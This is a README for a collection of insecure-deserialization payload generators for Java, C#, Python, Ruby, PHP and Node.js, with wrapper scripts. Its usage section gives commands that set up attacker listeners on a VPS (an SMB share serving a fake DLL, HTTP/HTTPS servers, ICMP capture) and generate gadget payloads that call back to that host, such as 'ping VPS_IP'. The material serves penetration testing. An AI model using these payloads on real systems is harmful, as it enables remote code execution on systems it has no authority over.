# INSECURE DESERIALIZATION SCRIPTS
This collection contains various tools for generating serialized payloads in different programming languages.

## TOOLS
* [Java - ysoserial.jar](https://github.com/frohoff/ysoserial)
    * [jargadgets.txt]()
* [C# - ysoserial.exe](https://github.com/pwntester/ysoserial.net/)
    * [RunYsoserial.ps1]() - Wrapper around ysoserial.net using all possible gadgets and formatters.
    * [netgadgets.txt]()
    * [netformatters.txt]()
* [Python - python_deser.py](PLACEHOLDER)
    * (Modified [Peas](https://github.com/j0lt-github/python-deserialization-attack-payload-generator))
* [Ruby - ruby_deser_vx.rb](PLACEHOLDER)
    * ([deser-ruby](https://github.com/klezVirus/deser-ruby) is an alternative tool for Ruby v3 which also supports YAML generation)
* [PHP - phpggc](https://github.com/ambionics/phpggc)
    * [php_deser.sh]() - Wrapper around phpggc that generates payloads from all possible gadgets in base64 format. 
    * [phpgadgets.txt]()
* [Node.js - deser-node.js](https://github.com/klezVirus/deser-node)
    * With deletec console.log() for clean output.
* [crimson_deser.sh]() - Wrapper around all generators except .NET

## USAGE
#### ON VPS
```bash
# TERMINAL 1
echo 123 > fake.dll
sudo impacket-smbserver deser . -smb2support
# TERMINAL 2
updog -p 443 --ssl 2>&1 | tee -a https.logs
# TERMINAL 3
python3 -m http.server 80 2>&1 | tee -a http.logs
# TERMINAL 4
sudo tcpdump -i any icmp -ttttt -w - -U | tee icmp.logs | tcpdump -r -
```
#### ON WINDOWS
```powershell
# In ysoserial directory
.\RunYsoserial.ps1 -collab 'ip_or_domain_here' -outputFormat 'base64' -outputFile 'deser.txt'
.\RunYsoserial.ps1 -collab 'ip_or_domain_here' -outputFormat 'hex' -outputFile 'deser.txt'
```

#### ON UNIX
```
./crimson_deser.sh "ping VPS_IP" "VPS_IP" "DOMAIN_COLLAB"
```

